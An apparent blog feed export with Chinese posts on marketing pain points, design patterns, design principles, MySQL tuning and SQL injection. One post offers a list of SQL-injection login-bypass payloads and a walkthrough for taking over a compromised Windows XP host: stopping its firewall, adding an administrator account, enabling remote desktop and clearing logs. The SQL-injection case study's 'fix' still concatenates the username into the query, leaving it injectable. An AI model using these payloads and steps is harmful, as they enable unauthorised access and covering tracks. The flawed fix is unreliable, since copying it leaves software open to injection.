是否需要花费很大成本</li></ul><p>找到了这个矩阵，你就会发现过去几乎所有的戒烟干预方式，都聚焦于“吸烟”这个过程，而且是“吸烟”的风险这个过程：</p><p>（强调：吸烟有害健康）</p><p>比如这个创意广告：</p><p>而其实可以有效干预的痛点有很多：</p><p>比如降低送烟的形象，想办法让送烟变成一种丢脸的行为。</p><p>比如降低吸烟的效用，让大众相信吸烟其实并不会提高注意力，等。</p><p><strong>甚至，构思这篇文章本身，李叫兽也在定位痛点：</strong></p><p>我的目标是让读者更多地学会如何定位用户的痛点。</p><p><strong>首先，我列出了定位用户痛点的过程：</strong><br>收集信息、了解哪些感受可以改变行为（心理学理论）、综合利用信息和理论。</p><p><strong>然后每个过程，都需要让读者“想要”这样做，并且“容易”做到（讲技巧）</strong></p><p>最终，我发现读者看文章只有 3 分钟时间，不可能把所有的心理学理论概括清楚，也讲不完用户调查方法。而且发现大部分人的关键问题并不是信息或者知识太少，而是没有巧妙地利用这些知识。</p><p><strong>所以把这篇文章解决的痛点定位成了最右下角的一部分：</strong></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>很多人没有找到用户的痛点，并不是因为欠缺信息（比如不知道用户怎么想的），而是没有有效地利用已有信息。</p><p>而如果你重新思考自己已经知道的，分析用户的每个动作过程，就会发现：痛点更容易找到！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23种设计模式的设计理念</title>
      <link href="2018/12/17/23-chong-she-ji-mo-shi-de-she-ji-li-nian/"/>
      <url>2018/12/17/23-chong-she-ji-mo-shi-de-she-ji-li-nian/</url>
      
        <content type="html"><![CDATA[<h1 id="23-种设计模式的设计理念"><a href="#23-种设计模式的设计理念" class="headerlink" title="23 种设计模式的设计理念"></a>23 种设计模式的设计理念</h1><h3 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title="什么是设计模式"></a>什么是设计模式</h3><p>设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理的运用设计模式可以完美的解决很多问题，每种模式在现在中都有相应的原理来与之对应，每一个模式描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是它能被广泛应用的原因。简单说：</p><ul><li>模式：在某些场景下，针对某类问题的某种通用的解决方案</li><li>场景：项目所在的环境</li><li>问题：约束条件，项目目标等</li><li>解决方案：通用、可复用的设计，解决约束达到目标<h3 id="设计模式的三个分类"><a href="#设计模式的三个分类" class="headerlink" title="设计模式的三个分类"></a>设计模式的三个分类</h3></li><li>创建型模式：对象实例化的模式，创建型模式用于解耦对象的实例化过程。</li><li>结构型模式：把类或对象结合在一起形成一个更大的结构。</li><li>行为型模式：类和对象如何交互，及划分责任和算法。<h1 id="各分类中模式的关键点"><a href="#各分类中模式的关键点" class="headerlink" title="各分类中模式的关键点"></a>各分类中模式的关键点</h1><h3 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h3></li><li>单例模式：某个类只能有一个实例，提供一个全局的访问点。</li><li>简单工厂：一个工厂类根据传入的参量决定创建出那一种产品类的实例。</li><li>工厂方法：定义一个创建对象的接口，让子类决定实例化那个类。</li><li>抽象工厂：创建相关或依赖对象的家族，而无需明确指定具体类。</li><li>建造者模式：封装一个复杂对象的构建过程，并可以按步骤构造。</li><li>原型模式：通过复制现有的实例来创建新的实例。<h3 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h3></li><li>适配器模式：将一个类的方法接口转换成客户希望的另外一个接口。</li><li>组合模式：将对象组合成树形结构以表示“”部分-整体“”的层次结构。</li><li>装饰模式：动态的给对象添加新的功能。</li><li>代理模式：为其他对象提供一个代理以便控制这个对象的访问。</li><li>亨元（蝇量）模式：通过共享技术来有效的支持大量细粒度的对象。</li><li>外观模式：对外提供一个统一的方法，来访问子系统中的一群接口。</li><li>桥接模式：将抽象部分和它的实现部分分离，使它们都可以独立的变化。<h3 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h3></li><li>模板模式：定义一个算法结构，而将一些步骤延迟到子类实现。</li><li>解释器模式：给定一个语言，定义它的文法的一种表示，并定义一个解释器。</li><li>策略模式：定义一系列算法，把他们封装起来，并且使它们可以相互替换。</li><li>状态模式：允许一个对象在其对象内部状态改变时改变它的行为。</li><li>观察者模式：对象间的一对多的依赖关系。</li><li>备忘录模式：在不破坏封装的前提下，保持对象的内部状态。</li><li>中介者模式：用一个中介对象来封装一系列的对象交互。</li><li>命令模式：将命令请求封装为一个对象，使得可以用不同的请求来进行参数化。</li><li>访问者模式：在不改变数据结构的前提下，增加作用于一组对象元素的新功能。</li><li>责任链模式：将请求的发送者和接收者解耦，使的多个对象都有处理这个请求的机会。</li><li>迭代器模式：一种遍历访问聚合对象中各个元素的方法，不暴露该对象的内部结构。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 23种设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈我对设计原则的理解</title>
      <link href="2018/12/11/tan-tan-wo-dui-she-ji-yuan-ze-de-li-jie/"/>
      <url>2018/12/11/tan-tan-wo-dui-she-ji-yuan-ze-de-li-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="说说你对设计原则的理解"><a href="#说说你对设计原则的理解" class="headerlink" title="说说你对设计原则的理解"></a>说说你对设计原则的理解</h1><h3 id="口诀"><a href="#口诀" class="headerlink" title="口诀"></a>口诀</h3><p>为了便于记忆，我们可以使用一个口诀来记忆面向对象设计原则：<strong>开口合里最单依</strong></p><ul><li>开：开闭原则</li><li>口：接口隔离原则</li><li>合：组合/聚合原则</li><li>里：里式替换原则</li><li>最：最少知识原则（迪米特法则）</li><li>单：单一职责原则</li><li>依：依赖倒置原则</li></ul><h3 id="开闭原则-Open-Closed-Principle-OCP"><a href="#开闭原则-Open-Closed-Principle-OCP" class="headerlink" title="开闭原则(Open-Closed Principle, OCP)"></a>开闭原则(Open-Closed Principle, OCP)</h3><p>一个软件实体应当对扩展开发,对修改关闭.说的是,再设计一个模块的时候,应当使这个模块可以在不被修改的前提下被扩展.换言之,应当可以在不必修改源代码的情况下改变这个模块的行为，在保持系统一定稳定性的基础上，对系统进行扩展。这是面向对象设计（OOD）的基石，也是最重要的原则。</p><h3 id="接口隔离原则-Interface-Segregation-Principle-ISP"><a href="#接口隔离原则-Interface-Segregation-Principle-ISP" class="headerlink" title="接口隔离原则(Interface Segregation Principle, ISP)"></a>接口隔离原则(Interface Segregation Principle, ISP)</h3><p>一个类对另外一个类的依赖是建立在最小的接口上。<br>使用多个专门的接口比使用单一的总接口要好.根据客户需要的不同,而为不同的客户端提供不同的服务是一种应当得到鼓励的做法.就像”看人下菜碟”一样,要看客人是谁,再提供不同档次的饭菜.<br>胖接口会导致他们的客户程序之间产生不正常的并且有害的耦合关系.当一个客户程序要求该胖接口进行一个改动时,会影响到所有其他的客户程序.因此客户程序应该仅仅依赖他们实际需要调用的方法.</p><h3 id="组合-聚合复用原则-Composite-Aggregate-Reuse-Principle，CARP"><a href="#组合-聚合复用原则-Composite-Aggregate-Reuse-Principle，CARP" class="headerlink" title="组合/聚合复用原则(Composite/Aggregate Reuse Principle，CARP)"></a>组合/聚合复用原则(Composite/Aggregate Reuse Principle，CARP)</h3><p>在一个新的对象里面使用一些已有的对象,使之成为新对象的一部分;新的对象通过这些向对象的委派达到复用已有功能的目的.这个设计原则有另一个简短的表述:要尽量使用合成/聚合,尽量不要使用继承.</p><p>#里氏代换原则(Liskov Substitution Principle，LSP)<br>由 Barbar Liskov (芭芭拉.里氏) 提出，是继承复用的基石。</p><p>所有引用基类的地方必须透明的使用其子类的对象。只要父类能出现的地方子类也可以出现，而且替换为子类不会产生任何错误或异常，但是反过来就不行，有子类出现的地方，父类未必就能适应。</p><h3 id="最少知识原则-Least-Knowledge-Principle，LKP"><a href="#最少知识原则-Least-Knowledge-Principle，LKP" class="headerlink" title="最少知识原则(Least Knowledge Principle，LKP)"></a>最少知识原则(Least Knowledge Principle，LKP)</h3><p>一个对象应当对其他对象有尽可能少的了解.</p><p>没有任何一个其他的 OO 设计原则象迪米特法则这样有如此之多的表述方式,如下几种：</p><ul><li>只与你直接的朋友们通信(Only talk to your immediate friends)</li><li>不要跟”陌生人”说话(Don’t talk to strangers)</li><li>每一个软件单位对其他的单位都只有最少的知识,而且局限于那些本单位密切相关的软件单位<br>就是说,如果两个类不必彼此直接通信,那么这两个类就不应当发生直接的相互作用,如果其中的一个类需要调用另一个类的某一个方法的话,可以通过第三者转发这个调用。</li></ul><h3 id="单一职责原则-Simple-responsibility-pinciple，SRP"><a href="#单一职责原则-Simple-responsibility-pinciple，SRP" class="headerlink" title="单一职责原则(Simple responsibility pinciple，SRP)"></a>单一职责原则(Simple responsibility pinciple，SRP)</h3><p>就一个类而言,应该仅有一个引起它变化的原因,如果你能想到多于一个的动机去改变一个类,那么这个类就具有多于一个的职责.应该把多于的指责分离出去,分别再创建一些类来完成每一个职责.</p><h3 id="依赖倒置原则-Dependence-Inversion-Principle"><a href="#依赖倒置原则-Dependence-Inversion-Principle" class="headerlink" title="依赖倒置原则(Dependence Inversion Principle)"></a>依赖倒置原则(Dependence Inversion Principle)</h3><p>要求客户端依赖于抽象耦合.</p><ul><li>模块间的依赖通过抽象发生，实现类之间不发生直接的依赖关系，其依赖关系是通过接口或抽象类产生的。</li><li>接口或抽象类不依赖实现类</li><li>实现类依赖接口或抽象类</li></ul><p>采用依赖倒置原则可以减少类间的耦合性，提高系统的稳定，降低并行开发引起的风险，提高代码的可读性和可维护性。</p>]]></content>
      
      
      <categories>
          
          <category> 设计原则 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 设计原则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL优化</title>
      <link href="2018/12/02/mysql-you-hua/"/>
      <url>2018/12/02/mysql-you-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-优化"><a href="#MySQL-优化" class="headerlink" title="MySQL 优化"></a>MySQL 优化</h1><ul><li>表关联查询时务必遵循 <strong>小表驱动大表</strong> 原则；</li><li>使用查询语句 <code>where</code> 条件时，不允许出现 <strong>函数</strong>，否则索引会失效；</li><li>使用单表查询时，相同字段尽量不要用 OR，因为可能导致索引失效，比如：<code>SELECT * FROM table WHERE name = &#39;手机&#39; OR name = &#39;电脑&#39;</code>，可以使用 <code>UNION</code>替代；</li><li><code>LIKE</code> 语句不允许使用 <code>%</code> 开头，否则索引会失效；</li><li>组合索引一定要遵循 <strong>从左到右</strong> 原则，否则索引会失效；比如：<code>SELECT * FROM table WHERE name = &#39;张三&#39; AND age = 18</code>，那么该组合索引必须是 <code>name,age</code> 形式；</li><li>索引不宜过多，根据实际情况决定，尽量不要超过 10 个；</li><li>每张表都必须有 <strong>主键</strong>，达到加快查询效率的目的；</li><li>分表，可根据业务字段尾数中的个位或十位或百位（以此类推）做表名达到分表的目的；</li><li>分库，可根据业务字段尾数中的个位或十位或百位（以此类推）做库名达到分库的目的；</li><li>表分区，类似于硬盘分区，可以将某个时间段的数据放在分区里，加快查询速度，可以配合 分表 + 表分区 结合使用；<h1 id="神器-EXPLAIN-语句"><a href="#神器-EXPLAIN-语句" class="headerlink" title="神器 EXPLAIN 语句"></a>神器 <code>EXPLAIN</code> 语句</h1></li></ul><p><code>EXPLAIN</code> 显示了 MySQL 如何使用索引来处理 <code>SELECT</code> 语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。</p><p>使用方法，在<code>SELECT</code> 语句前加上 <code>EXPLAIN</code> 即可，如：</p><blockquote><p>EXPLAIN SELECT * FROM tb_item WHERE cid IN (SELECT id FROM tb_item_cat)</p></blockquote><p><img src="https://www.funtl.com/assets1/Lusifer_20190210233927.png" alt></p><ul><li><p>id： SELECT 识别符。这是 SELECT 的查询序列号</p></li><li><p>select_type： SELECT类型,可以为以下任何一种</p><ul><li>SIMPLE: 简单 SELECT(不使用 UNION 或子查询)</li><li>PRIMARY: 最外面的 SELECT<ul><li>UNION: UNION 中的第二个或后面的 SELECT 语句</li></ul></li><li>DEPENDENT UNION: UNION 中的第二个或后面的 SELECT 语句,取决于外面的查询</li><li>UNION RESULT: UNION 的结果</li><li>SUBQUERY: 子查询中的第一个 SELECT</li><li>DEPENDENT SUBQUERY: 子查询中的第一个 SELECT,取决于外面的查询</li><li>DERIVED: 导出表的 SELECT(FROM 子句的子查询)</li></ul></li><li><p>table： 输出的行所引用的表</p></li><li><p>partitions： 表分区</p></li><li><p>type： 联接类型。下面给出各种联接类型，按照 <strong>从最佳类型到最坏类型</strong> 进行排序</p><ul><li>system: 表仅有一行(=系统表)。这是 const 联接类型的一个特例。</li><li>const: 表最多有一个匹配行,它将在查询开始时被读取。因为仅有一行,在这行的列值可被优化器剩余部分认为是常数。const 表很快,因为它们只读取一次!</li><li>eq_ref: 对于每个来自于前面的表的行组合, 从该表中读取一行。这可能是最好的联接类型, 除了 const 类型。</li><li>ref: 对于每个来自于前面的表的行组合, 所有有匹配索引值的行将从这张表中读取。</li><li>ref_or_null: 该联接类型如同 ref,但是添加了 MySQL 可以专门搜索包含 NULL 值的行。</li><li>index_merge: 该联接类型表示使用了索引合并优化方法。</li><li>unique_subquery: 该类型替换了下面形式的 IN 子查询的 ref: <code>value IN (SELECT primary_key FROM single_table WHERE some_expr)</code> unique_subquery 是一个索引查找函数, 可以完全替换子查询, 效率更高。</li><li>index_subquery: 该联接类型类似于 unique_subquery。可以替换 IN 子查询, 但只适合下列形式的子查询中的非唯一索引: value IN (SELECT key_column FROM single_table WHERE some_expr)</li><li>range: 只检索给定范围的行,使用一个索引来选择行。</li><li>index: 该联接类型与 ALL 相同,除了只有索引树被扫描。这通常比 ALL 快,因为索引文件通常比数据文件小。</li><li>ALL: 对于每个来自于先前的表的行组合, 进行完整的表扫描。</li></ul></li><li><p>possible_keys： 指出 MySQL 能使用哪个索引在该表中找到行</p></li><li><p>key： 显示 MySQL 实际决定使用的键(索引)。如果没有选择索引, 键是 NULL。</p></li><li><p>key_len： 显示 MySQL 决定使用的键长度。如果键是 NULL, 则长度为 NULL。</p></li><li><p>ref： 显示使用哪个列或常数与 key 一起从表中选择行。</p></li><li><p>rows： 显示 MySQL 认为它执行查询时必须检查的行数。多行之间的数据相乘可以估算要处理的行数。</p></li><li><p>filtered： 显示了通过条件过滤出的行数的百分比估计值。</p></li><li><p>Extra： 该列包含 MySQL 解决查询的详细信息</p><ul><li>Distinct: MySQL 发现第 1 个匹配行后,停止为当前的行组合搜索更多的行。</li><li>Not exists: MySQL 能够对查询进行 LEFT JOIN 优化, 发现 1 个匹配 LEFT JOIN 标准的行后, 不再为前面的的行组合在该表内检查更多的行。</li><li>range checked for each record (index map: #): MySQL 没有发现好的可以使用的索引, 但发现如果来自前面的表的列值已知, 可能部分索引可以使用。</li><li>Using filesort: MySQL 需要额外的一次传递, 以找出如何按排序顺序检索行。</li><li>Using index: 从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。</li><li>Using temporary: 为了解决查询, MySQL 需要创建一个临时表来容纳结果。</li><li>Using where: WHERE 子句用于限制哪一个行匹配下一个表或发送到客户。</li><li>Using sort_union(…), Using union(…), Using intersect(…): 这些函数说明如何为 index_merge 联接类型合并索引扫描。</li><li>Using index for group-by: 类似于访问表的 Using index 方式,Using index for group-by 表示 MySQL 发现了一个索引,可以用来查询 GROUP BY 或 DISTINCT 查询的所有列, 而不要额外搜索硬盘访问实际的表。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> MySQL优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后台常用万能密码</title>
      <link href="2018/11/23/wan-neng-mi-ma/"/>
      <url>2018/11/23/wan-neng-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p> 所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p><p><strong>分享给大家、、 希望对大家有所帮助！</strong></p><h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><pre><code>1：&quot;or &quot;a&quot;=&quot;a2：&#39;.).or.(&#39;.a.&#39;=&#39;.a3：or 1=1--4：&#39;or 1=1--5：a&#39;or&#39; 1=1--6：&quot;or 1=1--7：&#39;or.&#39;a.&#39;=&#39;a8：&quot;or&quot;=&quot;a&#39;=&#39;a9：&#39;or&#39;&#39;=&#39;10：&#39;or&#39;=&#39;or&#39;</code></pre><p>admin’or 1=1#</p><h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’/<em><br>密码</em>/‘<br>‘or 1=1/*</p><pre><code>&quot;or &quot;a&quot;=&quot;a&quot;or 1=1--&quot;or&quot;=&quot;&quot;or&quot;=&quot;a&#39;=&#39;a&quot;or1=1--&quot;or=or&quot;&#39;&#39;or&#39;=&#39;or&#39;&#39;) or (&#39;a&#39;=&#39;a&#39;.).or.(&#39;.a.&#39;=&#39;.a&#39;or 1=1&#39;or 1=1--&#39;or 1=1/*&#39;or&quot;=&quot;a&#39;=&#39;a&#39;or&#39; &#39;1&#39;=&#39;1&#39;&#39;or&#39;&#39;=&#39;&#39;or&#39;&#39;=&#39;&#39;or&#39;&#39;=&#39;&#39;or&#39;=&#39;1&#39;&#39;or&#39;=&#39;or&#39;&#39;or.&#39;a.&#39;=&#39;a&#39;or1=1--1&#39;or&#39;1&#39;=&#39;1a&#39;or&#39; 1=1--a&#39;or&#39;1=1--or &#39;a&#39;=&#39;a&#39;or 1=1--or1=1--</code></pre><p>通过该工具可以扫描常用的端口和指定的端口是否开放。</p><h3 id="常用端口号："><a href="#常用端口号：" class="headerlink" title="常用端口号："></a>常用端口号：</h3><p>代理服务器常用以下端口：</p><ul><li><p>HTTP协议代理服务器常用端口号：80/8080/3128/8081/9080</p></li><li><p>SOCKS代理协议服务器常用端口号：1080</p></li><li><p>FTP（文件传输）协议代理服务器常用端口号：21</p></li><li><p>Telnet（远程登录）协议代理服务器常用端口：23</p><hr>  HTTP服务器，默认的端口号为80/tcp（木马Executor开放此端口）；<p>  HTTPS（securely transferring web pages）服务器，默认的端口号为443/tcp 443/udp；</p><p>  Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）；</p><p>  FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）；</p><p>  TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；</p><p>  SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；</p><p>  SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz </p><p>  Stealth、WinPC、WinSpy都开放这个端口）；</p><p>  POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；</p><p>  WebLogic，默认的端口号为7001；</p><p>  Webshpere应用程序，默认的端口号为9080；<br>  webshpere管理工具，默认的端口号为9090；<br>  JBOSS，默认的端口号为8080；</p><p>  TOMCAT，默认的端口号为8080；</p><p>  WIN2003远程登陆，默认的端口号为3389；</p><p>  Symantec AV/Filter for MSE ,默认端口号为 8081；</p><p>  Oracle 数据库，默认的端口号为1521；</p><p>  ORACLE EMCTL，默认的端口号为1158；</p><p>  Oracle XDB（ XML 数据库），默认的端口号为8080；<br>  Oracle XDB </p><p>  FTP服务，默认的端口号为2100；</p><p>  MS SQL<em>SERVER数据库server，默认的端口号为1433/tcp 1433/udp；<br>  MS SQL</em>SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp；<br>  QQ，默认的端口号为1080/udp</p></li></ul><p>XP下双开3389的教程</p><p>用到的工具有</p><p>xp3389.exe  termsrvhack.dll  3389.bat 这么几个文件</p><p>首先关他的防火墙</p><p>就在这里面输入   net stop sharedaccess  再回车就OK了</p><p>现在我们先把xp3389.exe  termsrvhack.dll这2个文件传个肉鸡  3389.bat这个要修该后再传的</p><p>再运行它。看操作<br>OK! the Tsenabled成功<br>再输入Tasklist/SVC &gt;&gt;c:\3389.txt</p><p>再肉鸡里面找到3389.txt文件本地打开DcomLaunch, TermService  把这些英文前面的数字记下来</p><p>然后返回本地找到  3389.bat</p><p>右键编辑  把原来的覆盖掉  保持OK  再传给肉鸡  并运行他</p><p>已经OK了。好我们看下能不能连接</p><p>1：net stop sharedaccess(关掉防火墙命令)<br>              2：Tasklist/SVC &gt;&gt;c:\3389.txt<br>              3：net user 1 1 /add 意思是建立一下用户名为1密码也为1的用户<br>              4：net localgroup administrators 1 /add 把１这个用户提升为管理员权限</p><p>日志位于/windows/system32/logfiles/w3svc1目录下!<br>    主要原因：</p><pre><code> C:\WINDOWS\system32\LogFiles文件夹下为系统日志统计文件,文件系统并不自动删除。处理方法：对日志文件进行合理的清理。    清理方法如下：找到c:/winnt/system32/logfiles/w3svc1目录下的文件，队保留最近的几个日志外，清理干净就可以了！！FTP日志默认位置：%systemroot%\system32\logfiles\msftpsvc1\，默认每天一个。WWW日志默认位置：%systemroot%\system32\logfiles\w3svc1\，默认每天一个日志。</code></pre><p>强制登陆3389<br>mstsc /admin /v:IP:端口</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 万能密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的简单案例</title>
      <link href="2018/10/17/sql-zhu-ru-de-jian-dan-an-li/"/>
      <url>2018/10/17/sql-zhu-ru-de-jian-dan-an-li/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><p>SQL注入是现在普通使用的一种攻击手段，就是通过把非法的SQL命令插入到Web表单中或页面请求查询字符串中，最终达到欺骗服务器执行恶意的SQL语句的目的。SQL注入一旦成功，轻则直接绕开服务器验证，直接登录成功，重则将服务器端数据库中的内容一览无余，更有甚者，直接篡改数据库内容等。</p><h3 id="使用数据库客户端工具查询用户表"><a href="#使用数据库客户端工具查询用户表" class="headerlink" title="使用数据库客户端工具查询用户表"></a>使用数据库客户端工具查询用户表</h3><p>该表中有1个用户，账号为admin，明文密码为123456</p><p><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/6DCFD8AF50F74062B95CE1E4CDDE57C3/2811" alt></p><h3 id="访问ERP系统（对密码输入框进行SQL注入）"><a href="#访问ERP系统（对密码输入框进行SQL注入）" class="headerlink" title="访问ERP系统（对密码输入框进行SQL注入）"></a>访问ERP系统（对密码输入框进行SQL注入）</h3><ul><li><p>用户名输入：随便输</p></li><li><p>密码输入：’ OR ‘1’=’1<br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/3EA5BB79E7874011B25DFBD7AD9F7D79/2813" alt></p></li><li><p>发现可以登录进来<br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/1D3A486CE18442C39F8BF5C05FD28348/2815" alt></p></li></ul><h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3><p>密码验证的接口根据输入的用户名和密码查询数据表，如果查到用户记录的话，则认证通过。<br>代码如下:</p><pre><code>    public boolean auth(String userName,String password) throws Exception{        Connection conn = null;        try {            conn = DBUtil.getConnection();            Statement state = conn.createStatement();            //            String sql = &quot;SELECT * &quot; +                         &quot;FROM t_user &quot;+                         &quot;WHERE username=&#39;&quot;+userName+&quot;&#39; &quot; +                         &quot;AND pwd=&#39;&quot;+password+&quot;&#39;&quot;;            /*             * 密码输入:             * &#39; OR &#39;1&#39;=&#39;1             * sql注入攻击             *              */            System.out.println(sql);            ResultSet rs                 = state.executeQuery(sql);            //            if(rs.next()){                return true;            }        } catch (Exception e) {            e.printStackTrace();        } finally{            if(conn != null){                DBUtil.close(conn);            }        }        return false;    }</code></pre><p>实际执行的sql语句如下：</p><blockquote><p>SELECT * FROM t_user WHERE username=’1qwerwterrt’ AND pwd=’’ OR ‘1’=’1’;</p></blockquote><p>因为’1’=’1’永远成立，导致能够查询到所有的用户，所以登录认证通过。</p><p><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/CC4DF51160B54463B9B3389E1479D9D5/2817" alt></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>修改UserDAO类（使用shiro框架对输入的密码进行加密，然后再对数据库进行操作），具体步骤如下：</p><ul><li>修改用户注册的接口<br>修改后，代码如下：<pre><code>  /**   * 增加用户信息(注册时用)   * @param u   * @throws Exception   */  public void save(User u)throws Exception{      //设置盐巴      String salt = new SecureRandomNumberGenerator().nextBytes().toString();      //设置撒多少次盐巴      int times = 2;      //生成密文      String encodedPassword = new SimpleHash(&quot;md5&quot;,u.getPwd(),salt,times).toString();      Connection con = null;      PreparedStatement pst = null;      try{          con = DBUtil.getConnection();          pst = con.prepareStatement(&quot;insert into t_user(username,pwd,realname,gender,salt) values (?,?,?,?,?)&quot;);          pst.setString(1,u.getUsername());          pst.setString(2,encodedPassword);          pst.setString(3,u.getName());          pst.setString(4,u.getGender());          pst.setString(5,salt);          pst.executeUpdate();      }catch(Exception e){          e.printStackTrace();          throw e;      }finally{          DBUtil.close(con);      }         }</code></pre></li><li>修改登录认证的接口</li></ul><p>修改后，代码如下：</p><pre><code>    /**     * 登录认证     * @param userName     * @param password     * @return     * @throws Exception     */    public boolean auth(String userName,String password) throws Exception{        Connection conn = null;        User user = findByUserName(userName);        if(user==null){            return false;        }        //得到密文        String encodePassword = new SimpleHash(&quot;md5&quot;,password,user.getSalt(),2).toString();        try {            conn = DBUtil.getConnection();            Statement state = conn.createStatement();            //            String sql = &quot;SELECT * &quot; +                         &quot;FROM t_user &quot;+                         &quot;WHERE username=&#39;&quot;+userName+&quot;&#39; &quot; +                         &quot;AND pwd=&#39;&quot;+encodePassword+&quot;&#39;&quot;;            //打印被执行的SQL语句            System.out.println(sql);            ResultSet rs = state.executeQuery(sql);            //            if(rs.next()){                return true;            }        } catch (Exception e) {            e.printStackTrace();        } finally{            if(conn != null){                DBUtil.close(conn);            }        }        return false;    }</code></pre><h3 id="重新注册一个管理员账号"><a href="#重新注册一个管理员账号" class="headerlink" title="重新注册一个管理员账号"></a>重新注册一个管理员账号</h3><ul><li>输入用户名：sys</li><li>输入密码：123456</li></ul><p><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/3C2CF8B270C6492CBFE93A9816C06BA2/2819" alt></p><ul><li>数据表里面sys用户的密码为密文<br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/F9FB23BC189547068C8A1DA1DCC95BD3/2821" alt><h3 id="使用sys账号登录ERP系统（输入正确的密码）"><a href="#使用sys账号登录ERP系统（输入正确的密码）" class="headerlink" title="使用sys账号登录ERP系统（输入正确的密码）"></a>使用sys账号登录ERP系统（输入正确的密码）</h3></li></ul><p>输入密码为：123456<br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/203D1BF6D8964D4D8B6BCABF8F51CFFC/2823" alt></p><h3 id="使用sys账号登录ERP系统（对密码输入框进行SQL注入）"><a href="#使用sys账号登录ERP系统（对密码输入框进行SQL注入）" class="headerlink" title="使用sys账号登录ERP系统（对密码输入框进行SQL注入）"></a>使用sys账号登录ERP系统（对密码输入框进行SQL注入）</h3><p>输入密码为：’ OR ‘1’=’1<br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/719FDB661CA24416B059AAD8E8852D5B/2825" alt></p><h3 id="UserDAO类的完整代码"><a href="#UserDAO类的完整代码" class="headerlink" title="UserDAO类的完整代码"></a>UserDAO类的完整代码</h3><p>代码如下：</p><pre><code>package com.myerp.dao;import java.sql.Connection;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.sql.Statement;import org.apache.shiro.crypto.SecureRandomNumberGenerator;import org.apache.shiro.crypto.hash.SimpleHash;import com.myerp.model.User;import com.myerp.utils.DBUtil;/** * 针对用户表t_user的数据访问类 * @author yangzc * */public class UserDAO {    /**     * 按照username查询一个实体信息     * 注册时用于检测用户名是否重复     * 登录时用于检测用户名密码是否正确     * @param userName     * @return     * @throws Exception     */    public User findByUserName(String userName)throws Exception{        User user = null;        Connection conn = null;        PreparedStatement pst = null;        ResultSet rs = null;        try{            conn = DBUtil.getConnection();            pst = conn.prepareStatement(&quot;select * from t_user where username=?&quot;);            pst.setString(1, userName);            rs = pst.executeQuery();            while(rs.next()){                user = new User();                user.setId(rs.getInt(&quot;id&quot;));                user.setUsername(rs.getString(&quot;username&quot;));                user.setPwd(rs.getString(&quot;pwd&quot;));                user.setName(rs.getString(&quot;realname&quot;));                